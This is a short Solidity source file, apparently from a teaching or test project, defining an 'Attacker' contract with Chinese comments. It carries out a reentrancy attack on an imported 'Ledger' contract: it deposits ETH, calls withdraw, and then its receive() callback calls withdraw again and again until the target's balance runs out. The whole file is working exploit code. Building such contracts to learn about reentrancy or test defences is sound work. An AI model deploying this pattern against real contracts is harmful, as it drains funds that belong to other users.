pragma solidity ^0.8.13;

import {Ledger} from "../src/Ledger.sol";

contract Attacker {
    Ledger public target;
    uint256 public attackAmount;

    constructor(Ledger _target) {
        target = Ledger(_target);
    }

    // 攻击函数：调用目标合约的 withdraw 函数
    function attack() external payable {
        // 1. 先存入一些 ETH 到目标合约
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(attackAmount);
    }

    // 回调函数：当目标合约向攻击者转账时，会触发这个函数
    receive() external payable {
        // 2. 在回调函数中再次调用目标合约的 withdraw 函数，形成递归调用
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}